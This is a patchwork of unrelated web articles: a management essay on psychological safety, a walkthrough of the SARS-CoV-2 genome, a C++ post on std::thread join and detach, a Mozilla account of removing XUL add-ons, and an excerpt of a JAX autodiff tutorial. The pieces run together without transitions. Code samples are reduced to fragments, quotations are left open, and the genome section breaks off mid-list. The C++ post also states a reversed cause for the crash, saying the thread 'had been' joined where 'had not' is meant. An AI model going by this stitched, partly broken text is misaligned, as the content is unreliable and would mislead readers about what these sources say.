
<p><strong>The single best way to engage your employees is to give them an environment of trust.</strong> This means trusting them from day one, allowing them to be transparent with you, and enabling them to spread that culture to their peers.</p>

<p>Another way of saying this: provide psychological safety. And here’s how you start doing it today.</p>

<h2 id="inclusion">Inclusion</h2>

<p>The vital first step is to make everyone a part of the conversation. It doesn’t matter if you are the first engineering hire or your first day on the job. Every person needs equal <em>and equitable</em> footing to speak and share their ideas.</p>

<p>Remote employees tend to get marginalized in this step. You might think you’re giving everyone a voice but if you have a headquarters where everyone gathers by a water cooler to talk shop then you are leaving your remote employees out of the conversation.</p>

<p>Junior, less experienced employees are often thought to be included because you might go around the table to ask for people’s opinions but they are still neglected because they aren’t taken as seriously or with equal gravity to their more senior counterparts. And while there is something to be said for experience driving more sound decisions that shouldn’t exclude a great idea simply because someone is brand new to the industry.</p>

<p>Give everyone a voice and make them equally as loud.</p>

<h2 id="safety-to-learn-and-contribute">Safety to learn and contribute</h2>

<p>Google made a huge stir about 20% time; that you could take a whole day out of your week to do whatever you want to develop your career outside of your regular value-added work to the company.</p>

<p>Since when is software engineering a career where you only need to learn 20% of the time? <strong>Learning should be an integral, continuous part of the software engineer’s professional experience</strong>. And the biggest part of learning is trying new things, not getting them right the first time, and persevering to get back up and try again.</p>

<p>I just watched a great <a href="https://www.youtube.com/watch?v=9vJRopau0g0">TED talk</a> on how just giving children encouragement towards their goals gave them a <em>16% increase in their chance of success</em>. How much would you pay for 16% fewer bugs, 16% more output, and 16% more engagement from your employees? Well mail me your checks because you can do it all for free if you simply encourage a culture that <strong>failure is a gift</strong> and not something to be reprimanded for.</p>

<p>We learn when we fail. We also learn when we share that failure (and subsequent success) with our teammates and greater community. Not only do we need a platform to try and fail, we also need a platform to share our findings along the way. Being able to contribute to the greater community is another vital point of psychological safety.</p>

<p>In my teams, <strong>we acknowledge that even updates to documentation are contributions</strong>. I’ve met plenty of high achievers who are annoyed that they can’t contribute to code on day one. I tell them that if the README is checked into the code base, and you find a flaw in our setup README docs, then that is checking in code. <strong>All contributions are welcome.</strong></p>

<p>When you know that your README change was as valuable to the team as some hardcore algorithmic update to some C++ code, you remove the barrier to entry that only the most senior folks can make the most outstanding contributions. <strong>Outstanding contributions come from outstanding people.</strong></p>

<h2 id="safety-to-challenge-the-status-quo">Safety to challenge the status quo</h2>

<p>No one wants to rock the boat on their first day at the job. That’s why new hires are the only ones wearing button down shirts with collars. Everyone <em>thinks</em> they have to dress to impress and start off on the right foot and by the end of the week these same engineers are wearing t-shirts like the rest of us.</p>

<p>What if, like me, they just liked getting dressed up because they enjoy dressing up? Or what if you didn’t think that having to be in the office was required for productivity in the first place?</p>

<p>Having radical ideas is the basis for innovation. If you couldn’t challenge societal norms then the founders of Airbnb would have never been able to convince people that it’s totally okay to sleep on a strangers couch and that everyone would be doing it a decade later. If you asked anyone in 2004 that premise would not only sound absurd but downright dangerous.</p>

<p>Why are only the successful entrepreneurs allowed to innovate? Why can’t it be every single person in your group? The only barrier to this hurdle is yourself. There is literally <em>nothing</em> stopping you from having anyone challenging the status quo. All you have to do is <em>let go</em>. Control is hard for some folks to relinquish but it is essential if you want to get this part of psychological safety.</p>

<h2 id="no-fear">No fear</h2>

<p>Which leads me to my last point: no fear. Letting go of control is based on a fear you have that if you don’t have control then bad things will happen. A fear-based mentality will only get you so far. It is self-limiting in nature.</p>

<p>A fear-based culture leads to people feeling:</p>

<ul>
  <li>embarrassed</li>
  <li>marginalized</li>
  <li>threatened</li>
  <li>punished</li>
</ul>

<p>A fearless culture, meanwhile, leads to people feeling:</p>

<ul>
  <li>celebrated</li>
  <li>included</li>
  <li>empowered</li>
  <li>rewarded</li>
</ul>

<p>Which feelings do you want to feel?</p>

<p>I hope I’ve convinced you that psychological safety is the bedrock for high-performing teams. A fearless culture leads to greater productivity, higher engagement, and increased satisfaction at work. And it costs you nothing but relinquishing a bit of your control freak instincts to trust your group to do the right thing.</p>

<p>If you can take that first fearless leap towards a safe environment then you will be rewarded with all of the benefits that come along with it.</p>

    <p>Hello and welcome to my Coronavirus Genome Walkthrough.</p>

<p>(Hoping someone comes out with that Vaccine Speedrun soon. This boss battle is really shaping up to be an intense one and we’ll need all the artifacts we can get.)</p>

<p>Here, I aim to provide a <em>mechanistic explanation</em> of the SARS-CoV-2 genome’s syntax and semantics. Let’s investigate what the SARS-CoV-2 viral genome actually does as if reading through code like a compiler, from nucleotides to amino acids all the way to proteins. From the four base pairs all the way up to the completed protein-coated virus, what is a virus like this is actually made of on the concrete, physical level?</p>

<h3 id="understanding-a-full-system">Understanding a Full System</h3>

<p>The underlying purpose of this essay is less about the coronavirus <em>per se</em> and more about how having a small—but functionally complete—piece of viral RNA to analyze gives me a unique opportunity to try to understand a complete self-replicating machine from scratch. This is not a feat that I would have the fortitude to manually replicate with the full human genome, for example—but the coronavirus genome, like the <a href="http://openworm.org/">nematode genome</a>, is small enough that we stand a chance at building a complete understanding. The task is perhaps akin to <a href="https://distill.pub/2018/building-blocks/">interpretability</a>, but for biological systems instead of artificial neural networks.</p>

<p>As a consequence, this essay is not intended to produce epidemiological conclusions; there are plenty of other sources for that! This essay is about fully understanding a biological system at the chemical and physical level.</p>

<h3 id="play-curiosity-and-mechanical-understanding">Play, Curiosity, and Mechanical Understanding</h3>

<p>Throughout this essay, I follow my curiosity in the style of <a href="https://en.wikipedia.org/wiki/Serious_play">serious play</a>: if I <a href="https://www.readthesequences.com/Noticing-Confusion-Sequence">notice I’m confused</a> about something, I look into it and explore it until I’m satisfied that I now understand, and that my understanding is <em>a <a href="https://plato.stanford.edu/entries/science-mechanisms/#ConMec">mechanical</a> understanding</em>. Things are made of stuff! It turns out that we can understand that stuff!</p>

<p>I may skip over some details that were not confusing to me during my own research, but your journey need not be the same as mine. If you’re confused about something while reading this essay, I encourage you to go and look it up! <a href="http://agentyduck.blogspot.com/2015/06/the-art-of-noticing.html">Notice</a> when your curiosity arises; that’s the meditation. Together, we can <a href="http://samoburja.com/how-to-find-the-frontier-of-knowledge/">learn new things</a>.</p>

<p>This all, at least, has been my intention as I set out to create this piece! As Ken Liu said of his philosophy while translating The Three-Body Problem, “I may not have succeeded, but these were the standards I had in mind as I set about my task.”</p>

<p>Part 1, here, covers just the genome and its translation to proteins. I hope to also write a Part 2 which would cover the structure and function of those proteins, their protein-protein interactions, and the full viral life cycle.</p>

<!--Finally, as you may already be able to tell, this essay also serves as a philosophical manifesto-by-example of how to think concretely about problems in biology. Along the way, I give some of my thoughts about the role of thermodynamics in molecular biology, legibility in complex systems, pedagogy, and the future of computational modeling.-->

<p>Let’s get started.</p>



<p>As a reminder, SARS-CoV-2 is a <em>positive-sense single-stranded RNA virus</em>.</p>



<p>What does this mean we can expect?</p>

<ol>
  <li><em>Single-stranded</em>: Its genome is a single strand of <a href="https://en.wikipedia.org/wiki/RNA">RNA</a> (ssRNA).</li>
  <li><em>Positive-sense</em>: That single strand of RNA can be immediately translated into protein by the ribosomes of the cell it infects.</li>
</ol>

<p>From this we can also infer that one of the proteins the virus encodes for must be <em>RNA-dependent RNA polymerase</em> (RdRP), a protein which synthesizes new RNA given an RNA template. That’s right: RNA → RNA. However, according to the <a href="https://en.wikipedia.org/wiki/Central_dogma_of_molecular_biology">central dogma of molecular biology</a>, isn’t RNA → RNA an unconscionable heresy? Correspondingly, RdRP is not naturally found in cells! All known positive-sense ssRNA viruses therefore <em>must encode</em> RdRP in order to successfully commit this heresy.</p>



<p>…Wait a minute, the phrase “positive-sense ssRNA virus” implies the existence of <em>negative-sense</em> viruses. If those don’t encode their proteins directly, how can they possibly work?</p>

<h2 id="positive-sense-and-negative-sense">Positive sense and negative sense</h2>

<p>Negative-sense ssRNA viruses also exist! Influenza, Ebola, and measles are examples.</p>



<p>The inner contents of <em>negative-sense</em> ssRNA viruses consist not of an RNA genome but of a <em>ribonucleoprotein</em>, which incorporates both an RNA genome as well as a cohort of viral proteins capable of replicating RNA. Unlike positive-sense ssRNA viruses, negative-sense ssRNA viruses must travel with a working copy of their RNA-replicating proteins. This ribonucleoprotein has enzymatic activity!</p>

<h2 id="rdrp-as-drug-target">RdRP as drug target</h2>

<p>Since RdRP has (as far as I know) no legitimate purpose in human cells and is not naturally coded by them, might it offer a potential target for novel antiviral drugs?</p>

<p><a href="https://pubmed.ncbi.nlm.nih.gov/24102407/">Velkov et al. 2014</a> explores RdRP as a drug target for antivirals against the <a href="https://en.wikipedia.org/wiki/Henipavirus">Hendra virus</a>, a negative-sense ssRNA virus, though I am unable to find the full text.</p>

<!-- <div class="unfurl-embed-info-media-default gallery-item-selectable"><img class="unfurl-embed-card-feature-image" src="https://cdn.ncbi.nlm.nih.gov/pubmed/persistent/pubmed-meta-image.png"><div class="unfurl-embed-card-title unfurl-embed-card-title-default notranslate"><a href="https://pubmed.ncbi.nlm.nih.gov/24102407/">The RNA-dependent-RNA Polymerase, an Emerging Antiviral Drug Target for the Hendra Virus - PubMed</a></div><div class="unfurl-embed-card-description unfurl-embed-card-description-default notranslate"><div style="overflow: hidden; text-overflow: ellipsis; -webkit-box-orient: vertical; display: -webkit-box; -webkit-line-clamp: 2;">Australia is facing a major national medical challenge with the emergence of the Hendra virus (HeV) as a medically and economically important pathogen of humans and animals.

<blockquote>
  <p>This review examines the current knowledge based on the multi-domain architecture of the Hendra RdRP and highlights which essential domain functions represent tangible targets for drug development against this deadly disease.</p>
</blockquote>

<p>There must be some reason that developing antivirals against this protein is technically (or socially) complicated, or I’d have expected us to do it by now – there are a lot of RNA viruses that this drug target could theoretically hit. Flagging this discrepancy for further research.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">1</a></sup></p>



<p>Back to SARS-CoV-2! First, let’s get us a genome. Obviously this virus has seen some mutations as it’s spread around, as you can explore at <a href="https://nextstrain.org/ncov/global">NextStrain</a>, so we’ve technically got choices as to which one to analyze. For this thread I’ll just stick to analyzing <em>one</em> version of the genome: Wuhan-Hu-1.</p>

<p>As a reminder, each <code>A</code>, <code>G</code>, <code>C</code>, and <code>T</code> in a genome is one of the four <a href="https://en.wikipedia.org/wiki/Nucleotide">nucleotides</a>: <a href="https://en.wikipedia.org/wiki/Adenine">adenine</a>, <a href="https://en.wikipedia.org/wiki/Guanine">guanine</a>, <a href="https://en.wikipedia.org/wiki/Cytosine">cytosine</a>, and <a href="https://en.wikipedia.org/wiki/Thymine">thymine</a>. There are actually <a href="https://www.scripps.edu/romesberg/publications.html">plenty of ways to engineer</a> different <a href="https://pubmed.ncbi.nlm.nih.gov/22850726/">unnatural base pair systems</a> by adding <a href="https://science.sciencemag.org/content/363/6429/884">artificial nucleotides</a>, and these can even be integrated into <a href="https://www.pnas.org/content/98/9/4922">transcription</a> and <a href="https://www.nature.com/articles/nature24659">translation</a>, but <a href="https://carlbrannen.wordpress.com/2007/06/13/why-does-dna-only-use-4-nucleotides/">for</a> <a href="https://dreamerbiologist.wordpress.com/2013/02/16/why-did-nature-settle-on-just-four-nucleotides/">whatever</a> <a href="https://www.pnas.org/content/114/32/E6476">reason</a>, these four <a href="https://www.nature.com/articles/s41467-018-07389-2">and not others</a> are <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3331698/">what life ultimately ended up with</a>.</p>

<p><img src="https://csvoss.com/images/nucleotides.png"></p>
<p><small>The four nucleotides in DNA.</small></p>

<p>The genome of Wuhan-Hu-1 is available from <a href="https://www.ncbi.nlm.nih.gov/nuccore/MN908947.3">NCBI GenBank</a>. Since SARS-CoV-2 is an RNA virus, each <code>T</code> in this string technically represents a <code>U</code>, for <a href="https://en.wikipedia.org/wiki/Uracil">uracil</a>, RNA’s information-equivalent of thymine. The genome sequence is therefore:</p>

<div><div><pre><code>1     AUUAAAGGUU UAUACCUUCC CAGGUAACAA ACCAACCAAC UUUCGAUCUC UUGUAGAUCU
61    GUUCUCUAAA CGAACUUUAA AAUCUGUGUG GCUGUCACUC GGCUGCAUGC UUAGUGCACU
121   CACGCAGUAU AAUUAAUAAC UAAUUACUGU CGUUGACAGG ACACGAGUAA CUCGUCUAUC

...

29761 ACAGUGAACA AUGCUAGGGA GAGCUGCCUA UAUGGAAGAG CCCUAAUGUG UAAAAUUAAU
29821 UUUAGUAGUG CUAUCCCCAU GUGAUUUUAA UAGCUUCUUA GGAGAAUGAC AAAAAAAAAA
29881 AAAAAAAAAA AAAAAAAAAA AAA
</code></pre></div></div>

<p><a target="blank" href="https://benchling.com/s/seq-28k9llmwnY475iv7ogwF/edit">Follow along with the genome »</a></p>

<p>That’s 29,903 nucleotides. Since there are only four possible nucleotides, we can estimate the information compression value of each nucleotide at approximately 2 bits; the virus’s genome therefore requires only 7.5 kilobytes to store. That’s roughly as much data, byte for byte, as there are characters in this essay up to this point!</p>

<p>Lay out those 29,903 nucleobases along a ribose-phosphate backbone, reading them left to right <a href="https://en.wikipedia.org/wiki/Directionality_(molecular_biology)">from the 5’ end to the 3’ end</a>, and bam – if that single molecule* were teleported into a cell, that’s 100% chemically sufficient** to infect a person with the plague du jour.</p>

<p><small>How to interpret the Wuhan-Hu-1 genome as a complete molecule.</small></p>

<h2 id="poly-a-tail">Poly-A tail</h2>

<p>First question, and perhaps the most obvious one to the naked eye – what’s with all the <code>AAAAA</code> at the end of the viral genome?</p>

<div><div><pre><code>29821 ...                                                ... AAAAAAAAAA

</code></pre></div></div>
<p><a target="blank" href="https://benchling.com/s/seq-28k9llmwnY475iv7ogwF/edit">Follow along with the genome »</a></p>

<p>It’s… yelling at us? Is it… suffering? Should we <a href="https://reducing-suffering.org/is-there-suffering-in-fundamental-physics/">help</a>?</p>

<p>Simple: It’s a <a href="https://bioinformatics.stackexchange.com/questions/11227/why-does-the-sars-cov2-coronavirus-genome-end-in-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">3’ poly-A tail</a>! This <a href="https://en.wikipedia.org/wiki/Polyadenylation">long tail of adenosine monomers</a> is extremely common in both our own cells and in RNA viruses.</p>

<p>Our own messenger RNA (mRNA) has a poly-A tail when it’s freshly produced in the nucleus so as to slow its degradation by the cell, allowing it to last long enough to be transcribed into protein. Naturally, if you’re a positive-strand RNA virus, you’re also going to want to last long enough to be transcribed into protein – so, you need the same feature, yourself.</p>

<p>Genome 0.11% explained. So far so good!</p>

<h2 id="5-cap">5’ cap</h2>

<p>While we’re discussing chemical features of mRNA, note that the viral genome presumably must also have a <a href="https://en.wikipedia.org/wiki/Five-prime_cap">5’ cap</a> – an extra <a href="https://en.wikipedia.org/wiki/7-Methylguanosine">7-methylguanosine</a> at the 5’ end of its RNA strand – just like mRNAs do.</p>

<p><img src="https://csvoss.com/images/5primecap.png"></p>
<p><small>A 5' cap, consisting of a 7-methylguanosine as well as methylation of the first two ribose sugars.</small></p>

<p>The cap is not directly shown in the viral genome sequence or mentioned in NCBI GenBank, but it is referenced in multiple papers discussing coronaviral genomes:</p>

<blockquote>
  <p>Since 2003, the outbreak of severe acute respiratory syndrome coronavirus has drawn increased attention and stimulated numerous studies on the molecular virology of coronaviruses. Here, we review the current understanding of the mechanisms adopted by coronaviruses to produce the 5′-cap structure and methylation modification of viral genomic RNAs.</p>
</blockquote>



<blockquote>
  <p>Coronaviruses possess a cap structure at the 5′ ends of viral genomic RNA and subgenomic RNAs, which is generated through consecutive methylations by virally encoded guanine-N7-methyltransferase (N7-MTase) and 2′-O-methyltransferase (2′-O-MTase). The coronaviral N7-MTase is unique for its physical linkage with an exoribonuclease (ExoN) harbored in nonstructural protein 14 (nsp14) of coronaviruses.</p>
</blockquote>



<blockquote>
  <p>Here, we have reconstituted complete SARS-CoV mRNA cap methylation <em>in vitro</em>.</p>

<p>Like the poly-A tail, the 5’ cap helps the genome to be recognized and translated by ribosomes rather than destroyed by the cell’s immune response.</p>

<p>How does the virus even ensure that it receives a 5’ cap and a poly-A tail, not to mention its outer coat? Hopefully these questions will be resolved by our review of its genes and proteins… let’s move on to look at those!</p>



<p>Per the “Features” section of the genome, again from <a href="https://www.ncbi.nlm.nih.gov/nuccore/MN908947.3">NCBI GenBank</a>, here are the identifiable genes in this genome, in order:</p>

      <h3 id="introduction">Introduction</h3>

<p>When we write multithread C++ programs, we might be curious why we always have to call <code>join()</code> or <code>detach()</code> for the new threads. In some scenarios, if we forgot to call <code>join()</code> or <code>detach()</code> for the new threads, there might be peculiar program crashes which are hard to troubleshoot.</p>



<p>In this blog post, I would like to discuss the consequence of not calling <code>join()</code> or <code>detach()</code> for the new threads, and some of the methods that could make sure that <code>join()</code> or <code>detach()</code> for the new threads are always called.</p>

<h3 id="consequences-for-no-join-or-detach">Consequences for No Join or Detach</h3>

<p>The consequence of not calling <code>join()</code> or <code>detach()</code> for the new threads is program termination due to <a href="https://en.cppreference.com/w/cpp/error/terminate"><code>std::terminate</code></a> was called.</p>



<p>Let’s check the following example. The main function in the main thread instantiated a <code>new_thread</code> which sleeps 5 seconds, then the main thread itself sleeps 1 second before it goes out of the scope.</p>

<div><div><pre><code><span>// example.cpp</span>

    <span>thread_sleep</span><span>(</span><span>1</span><span>,</span> <span>true</span><span>);</span>
    <span>// new_thread.join();</span>
    <span>// new_thread.detach();</span>
    <span>return</span> <span>0</span><span>;</span>
    <span>// new_thread destructor will be called</span>
<span>}</span>
</code></pre></div></div>

<p>We compiled the program using the following command.</p>

<div><div><pre><code>$ g++ -std=c++14 example.cpp -lpthread -o example
</code></pre></div></div>

<p>When we executed the program, the program crashed.</p>

<div><div><pre><code>$ ./example
Thread 139772469839680 sleeping for 1 seconds ...
Thread 139772469835520 sleeping for 5 seconds ...
Thread 139772469839680 sleeping complete! 
terminate called without an active exception
Aborted (core dumped)
</code></pre></div></div>

<p>This is because, when the execution of the main function finished, the destructor of <code>new_thread</code> will be automatically called for garbage collection. In the description of the destructor <a href="https://en.cppreference.com/w/cpp/thread/thread/~thread"><code>std::thread::~thread</code></a>, If <code>*this</code> has an associated thread (<code>joinable() == true</code>), <code>std::terminate()</code> is called. If the <code>std::thread</code> object has been called with <code>join()</code> or <code>detach()</code>, <code>joinable()</code> would become <code>false</code>, otherwise it is always <code>true</code>. Because <code>new_thread</code> had been called with <code>join()</code> or <code>detach()</code> before its destructor was called, <code>joinable()</code> was <code>true</code> and <code>std::terminate()</code> was called and the C++ runtime was killed.</p>



<p>Although it terminates the program brutally, such design has its rationale. Without the <code>std::terminate()</code> mechanism in the destructor <code>std::thread::~thread</code>, if the users wanted to do <code>join()</code>, but forgot to call <code>join()</code>, the <code>new_thread</code> will run in the background just like the <code>detach()</code> behaviors. This might cause undefined behaviors.</p>

<h3 id="caveats">Caveats</h3>

<p>In addition to forget writing <code>join()</code> or <code>detach()</code> in the code, which is easy to find out, sometimes we have written <code>join()</code> or <code>detach()</code> in the code but they were not called due to exceptions. This will also results in program crash and might be difficult to troubleshoot.</p>



<p>The most conventional way is to add <code>join()</code> or <code>detach()</code> in the <code>catch</code> block.</p>

<p>There are other ways to deal with the thread issue, such as using RAII.</p>



<p>We could create an instance of <code>ThreadGuard</code> right after the <code>std::thread</code> object is created. This instance of <code>ThreadGuard</code> would make sure the <code>std::thread</code> object always call <code>join()</code> or <code>detach()</code> before going out of scope.</p>

<p>Implementing some <code>std::thread</code> wrapper is also not a bad idea. Boost has a <a href="https://www.boost.org/doc/libs/1_74_0/doc/html/thread/ScopedThreads.html"><code>ScopedThreads</code></a> library whose wrapper implementation is similar to the following <code>ScopedThread</code> class.</p>

<p>Although program termination during C++ program development and test helps us to find out the missing <code>join()</code> and <code>detach()</code> during runtime, if the program is not well tested and the missing <code>join()</code> and <code>detach()</code> go into the deployment, it will be a big headache to realize. We don’t want our program to crash during deployment! Try to think of all the possible scenarios, catch the exceptions and deal with them appropriately!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>TL;DR: Firefox used to have a great extension mechanism based on the XUL and XPCOM. This mechanism served us well for a long time. However, it came at an ever-growing cost in terms of maintenance for both Firefox developers and add-on developers. On one side, this growing cost progressively killed any effort to make Firefox secure, fast or to try new things. On the other side, this growing cost progressively killed the community of add-on developers. Eventually, after spending years trying to protect this old add-on mechanism, Mozilla made the hard choice of removing this extension mechanism and replacing this with the less powerful but much more maintainable WebExtensions API. Thanks to this choice, Firefox developers can once again make the necessary changes to improve security, stability or speed.</p>

<p>During the past few days, I’ve been chatting with Firefox users, trying to separate fact from rumor regarding the consequences of the August 2020 Mozilla layoffs. One of the topics that came back a few times was the removal of XUL-based add-ons during the move to Firefox Quantum. I was very surprised to see that, years after it happened, some community members still felt hurt by this choice.</p>

<p>And then, as someone pointed out on reddit, I realized that we still haven’t taken the time to explain in-depth why we <em>had no choice</em> but to remove XUL-based add-ons.</p>

<p>So, if you’re ready for a dive into some of the internals of add-ons and Gecko, I’d like to take this opportunity to try and give you a bit more detail.</p>



<p>For a very long time, Firefox was composed of a very small core on top of which everything was implemented as extensions. Many of these extensions were written in C++, others in JavaScript and many involved the XUL interface language and the XBL binding language. C++ and JavaScript code were connected thanks to a technology called XPCOM. Whenever an extension developer wished to customize Firefox, it was simple and extremely powerful, as the exact same building blocks used to power Firefox could be used to customize it.</p>

<p>This is how Session Restore (the technology that lets you resume Firefox where you left it the last time, even in case of crash) or the Find Bar were first implemented in Firefox, among other features. This is the technology that powers Firefox and <a href="https://www.thunderbird.net/">Thunderbird</a>. This is how tools such as <a href="https://en.wikipedia.org/wiki/Songbird_(software)">Songbird</a> (an open-source iTunes competitor) or <a href="https://en.wikipedia.org/wiki/Instantbird">Instantbird</a> (a chat client) were developed. This is also how I customized Firefox to become an eBook reader a long time ago. And this is how thousands of Firefox add-ons were developed.</p>

<p>Many people call this extension mechanism “XUL-based Add-Ons”, or sometimes “XPCOM-based Add-Ons”, and I’ll use both terms in this blog entry, but I often think of this as the “Promiscuous Extension Mechanism”, for several reasons:</p>

<ul>
<li>very quickly, add-on developers realized that anything they did could break anything else in the system, including other add-ons and Firefox itself, and they often had no way to prevent this;</li>
<li>similarly, anything Firefox developers did could break add-ons, and they often had no way to prevent this;</li>
<li>also, some of the changes that Firefox needed to be as fast, as stable and as secure as possible were going to break most add-ons immediately, possibly all add-ons in the longer term;</li>
<li>oh, and by the way, since add-ons could do everything, they could very easily do anything to the operating system, from stealing passwords to pretending to be your bank.</li>
</ul>

<p>Note: Having read in comments that some users apparently do not care about security, let me add that being secure is a really, really important point for Mozilla and has been since the first day. Regardless of add-ons, <em>not</em> having security means that an exploit is eventually going to show up that will steal user’s passwords and use them to steal their bank accounts – and that exploit will get sold around and will soon show up everywhere. Firefox developers fight this threat daily by all sorts of means, including code reviews, defensive programming, crash scene investigations, several types of sandboxing, static analysis, memory-safe languages, … Consequently, for Mozilla, if a feature prevents us from achieving great security, we <em>always</em> pick security over features.</p>

<p>I’ll return to these points in more details later. For the moment, suffices to say that it had been clear to Firefox developers for a long time (at least since 2010) that this situation was untenable. So Mozilla came up with a backup plan called the <em>Firefox Jetpack</em>.</p>

<p>Firefox Jetpack was a very different manner of extending Firefox. It was much cleaner. It finally had a permissions mechanism (something that had been suggested even before Firefox was called Firefox and that was generally considered too hard to implement). Out of the box, add-ons could not break each other or Firefox (I seem to remember that it was still sometimes possible by exploiting the observer service, but you had to work hard at it), it made extensive use of async programming (which was great to achieve a feeling of high-performance) and thanks to the fact that it had a finite API, it could be tested, which meant that when Firefox developers broke add-ons, they knew about it immediately and could fix the breakages! That was several enormous steps forward. This came at the cost of a more limited API but in most cases, the tradeoff seemed worth it.</p>

<p>Unfortunately, it turned out that there was an unexpected incompatibility between the design of Jetpack and some of the major changes that were needed in Firefox. I’m not entirely clear about what this incompatibility was but this meant that we had to abandon Jetpack.
Instead, we introduced WebExtensions. Overall, WebExtensions had a similar objective as Jetpack-based add-ons, with a similarly restricted API and the added bonus that they could be made to work on both Chromium-based browsers and Firefox.</p>

<p>If you needed very advanced APIs, switching from the promiscuous extension mechanism to Jetpack or WebExtensions was not always possible, but for most extensions, the transition was simple – in my personal experience, it was even pleasant.</p>

<p>Firefox introduced WebExtensions in time for Firefox Quantum because this is when the promiscuous add-on model was scheduled to break.</p>

<p>At this stage, we’re done with the historical overview. I hope you’re ready for a more technical dive because that’s how I’m going to explain to you exactly which problems were solved as we switched from the promiscuous extension model to WebExtensions.</p>



<h2 id="how-it-started">How it started</h2>

<p>XPCOM, the Xross-Platform Component Object Model, is perhaps the feature of Firefox that can best be described as <em>the core</em> (for people who know Gecko in-depth, I’m counting XPConnect and the Cycle Collector as part of XPCOM), alongside SpiderMonkey, our JavaScript Virtual Machine.</p>

<p>XPCOM is a technology that lets you write code in two languages and have each other call the other. The code of Firefox is full of C++ calling JavaScript, JavaScript calling C++ and a long time ago, we had projects that added Python and .Net in the mix. This piece of machinery is extremely complicated because languages do not share the same definitions (what’s a 64-bit integer in JavaScript? what’s a JavaScript exception in C++?) or the same memory model (how do you handle a JavaScript object holding a reference to a C++ object that C++ might wish to <code>delete</code> from memory?) or the same concurrency model (JavaScript workers share nothing while C++ threads share everything).</p>

<p>Gecko itself was originally designed as thousands of XPCOM components that could each be implemented in C++ or in JavaScript, tested individually, plugged, unplugged or replaced dynamically and <em>it worked</em>. In addition, the XPCOM architecture made for much cleaner C++ programming than was available at the time, worked on dozens of platforms, and let us combine the convenience of writing code in JavaScript and the raw speed permitted by C++.</p>

<p>To write a XPCOM component, you typically define <a href="https://searchfox.org/mozilla-central/rev/6cc48251bb97600fdf11a5b4c5f621bfc8606d55/dom/interfaces/base/nsIFocusManager.idl">an interface</a>, then write the implementation in either C++ or JavaScript (or Rust, nowadays, and maybe soon Wasm). Some boilerplate is needed, but hey, it works.</p>

<p>When early Firefox developers decided to open the platform to extensions, XPCOM was immediately picked as the base technology for add-ons. Firefox just had to let add-on authors plug anywhere within the code and they would have tremendous power at their disposal.</p>

<p>And add-on developers (including myself) certainly did and had lots of fun with it!</p>

<h2 id="the-era-of-immutable-xpcom">…the era of immutable XPCOM</h2>

<p>Unfortunately, problems progressively started to creep up.</p>

<p>When you’re developing a large application, you need to change things, either to fix bugs or to add new features, or to improve performance. In the XPCOM world, this meant changing XPCOM components. Sometimes to add new features to a component. Sometimes to entirely remove one because this design has been replaced with a better design.</p>

<p>In the first era of the XPCOM-based extension mechanism, this was often forbiddden. If there was an XPCOM component used by add-ons, it simply <strong>could not</strong> be changed in incompatible ways. This was great for add-on developers but it quickly became a nightmare for Firefox developers. Because every single change had to be made in backwards-compatible way both externally (for web developers) and internally (for add-on developers). This meant that each XPCOM component <code>nsISomething</code> was quickly accompanied by a <code>nsISomething2</code>, which was the better component – and both needed to be made to work alongside each other - One case was even more complicated to handle by Firefox developers: XPCOM-based add-ons could replace <em>any existing XPCOM component</em>. Needless to say, this was a very good way to break Firefox in ways that puzzled Firefox crash investigators.</p>

<p>This meant that development became slower and slower as we needed to check each new feature or each improvement against not only current features, but also past/deprecated features or simply old ways to work …</p></article></div>

<p><code><span>grad</span></code> takes a function and returns a function. If you have a Python function <code><span>f</span></code> that evaluates the mathematical function <span>\(f\)</span>, then <code><span>grad(f)</span></code> is a Python function that evaluates the mathematical function <span>\(\nabla f\)</span>. That means <code><span>grad(f)(x)</span></code> represents the value <span>\(\nabla f(x)\)</span>.</p>
<p>Since <code><span>grad</span></code> operates on functions, you can apply it to its own output to differentiate as many times as you like:</p>

<p>This <code><span>grad</span></code> API has a direct correspondence to the excellent notation in Spivak’s classic <em>Calculus on Manifolds</em> (1965), also used in Sussman and Wisdom’s <a href="http://mitpress.mit.edu/sites/default/files/titles/content/sicm_edition_2/book.html">*Structure and Interpretation of Classical Mechanics*</a> (2015) and their <a href="https://mitpress.mit.edu/books/functional-differential-geometry">*Functional Differential Geometry*</a> (2013). Both books are open-access. See in particular the “Prologue” section
of <em>Functional Differential Geometry</em> for a defense of this notation.</p>
<p>Essentially, when using the <code><span>argnums</span></code> argument, if <code><span>f</span></code> is a Python function for evaluating the mathematical function <span>\(f\)</span>, then the Python expression <code><span>grad(f,</span> <span>i)</span></code> evaluates to a Python function for evaluating <span>\(\partial_i f\)</span>.</p>

<h3>Hessian-vector products with <code><span>grad</span></code>-of-<code><span>grad</span></code><a href="#Hessian-vector-products-with-grad-of-grad" title="Permalink to this headline">¶</a></h3>
<p>One thing we can do with higher-order <code><span>grad</span></code> is build a Hessian-vector product function. (Later on we’ll write an even more efficient implementation that mixes both forward- and reverse-mode, but this one will use pure reverse-mode.)</p>
<p>A Hessian-vector product function can be useful in a <a href="https://en.wikipedia.org/wiki/Truncated_Newton_method">truncated Newton Conjugate-Gradient algorithm</a> for minimizing smooth convex functions, or for studying the curvature of neural network training objectives (e.g. <a href="https://arxiv.org/abs/1406.2572">1</a>, <a href="https://arxiv.org/abs/1811.07062">2</a>, <a href="https://arxiv.org/abs/1706.04454">3</a>, <a href="https://arxiv.org/abs/1802.03451">4</a>).</p>
<p>For a scalar-valued function <span>\(f : \mathbb{R}^n \to \mathbb{R}\)</span> with continuous second derivatives (so that the Hessian matrix is symmetric), the Hessian at a point <span>\(x \in \mathbb{R}^n\)</span> is written as <span>\(\partial^2 f(x)\)</span>. A Hessian-vector product function is then able to evaluate</p>
<p><span>\(\qquad v \mapsto \partial^2 f(x) \cdot v\)</span></p>
<p>for any <span>\(v \in \mathbb{R}^n\)</span>.</p>
<p>The trick is not to instantiate the full Hessian matrix: if <span>\(n\)</span> is large, perhaps in the millions or billions in the context of neural networks, then that might be impossible to store.</p>
<p>Luckily, <code><span>grad</span></code> already gives us a way to write an efficient Hessian-vector product function. We just have to use the identity</p>
<p><span>\(\qquad \partial^2 f (x) v = \partial [x \mapsto \partial f(x) \cdot v] = \partial g(x)\)</span>,</p>
